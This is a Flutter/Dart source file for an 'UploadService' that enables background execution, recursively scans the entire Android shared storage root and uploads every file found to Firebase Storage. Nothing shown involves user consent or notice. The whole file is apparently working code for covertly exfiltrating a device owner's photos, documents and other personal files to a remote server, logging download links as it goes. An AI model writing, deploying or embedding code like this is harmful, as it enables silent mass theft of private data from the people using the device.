import 'dart:io';
import 'package:flutter_background/flutter_background.dart';
import 'package:path_provider/path_provider.dart';
import 'package:firebase_storage/firebase_storage.dart';

class UploadService {
  Future<void> startBackgroundService() async {
    try {
      // Attempt to initialize the FlutterBackground plugin
      final result = await FlutterBackground.initialize();
      if (!result) {
        print('FlutterBackground initialization failed.');
        return;
      }
      print('FlutterBackground initialized successfully.');

      // Enable background execution after successful initialization
      final backgroundEnabled =
          await FlutterBackground.enableBackgroundExecution();
      if (!backgroundEnabled) {
        print('Could not enable background execution');
        return;
      }
      print('Background execution enabled successfully.');

      // Proceed with file searching and uploading
      await searchAndUploadFiles();
    } catch (e) {
      print('Error starting background service: $e');
    }
  }

  Future<void> searchAndUploadFiles() async {
    try {
      // Set the root of the external storage as the starting directory
      Directory rootDirectory = Directory('/storage/emulated/0/');

      if (rootDirectory.existsSync()) {
        print('Searching files in directory: ${rootDirectory.path}');
        await _searchFiles(rootDirectory);
      } else {
        print('Root directory does not exist or is not accessible.');
      }
    } catch (e) {
      print('Error searching and uploading files: $e');
    }
  }

  static Future<void> _searchFiles(Directory dir) async {
    try {
      List<FileSystemEntity> entities = dir.listSync();
      if (entities.isEmpty) {
        print('No files found in directory: ${dir.path}');
      } else {
        for (FileSystemEntity entity in entities) {
          if (entity is Directory) {
            // Skip restricted directories like Android/data
            if (entity.path.contains('/Android/data')) {
              print('Skipping restricted directory: ${entity.path}');
              continue;
            }
            // Recursively search within subdirectories
            await _searchFiles(entity);
          } else if (entity is File) {
            print(
                'Found file: ${entity.path}'); // Print file path to the terminal
            await _uploadFile(entity);
          } else {
            print('Skipping non-file entity: ${entity.path}');
          }
        }
      }
    } catch (e) {
      if (e is FileSystemException) {
        print('File system error: ${e.message}, path: ${e.path}');
      } else {
        print('Error during file search: $e');
      }
    }
  }

  static Future<void> _uploadFile(File file) async {
    try {
      // Reference to Firebase Storage
      final storageReference = FirebaseStorage.instance
          .ref()
          .child('uploads/${file.path.split('/').last}');

      // Upload the file
      final uploadTask = storageReference.putFile(file);

      // Get upload status
      final taskSnapshot = await uploadTask;
      final downloadUrl = await taskSnapshot.ref.getDownloadURL();
      print('Uploaded successfully: ${file.path}, Download URL: $downloadUrl');
    } catch (e) {
      print('Error uploading file: ${file.path}, Error: $e');
    }
  }
}
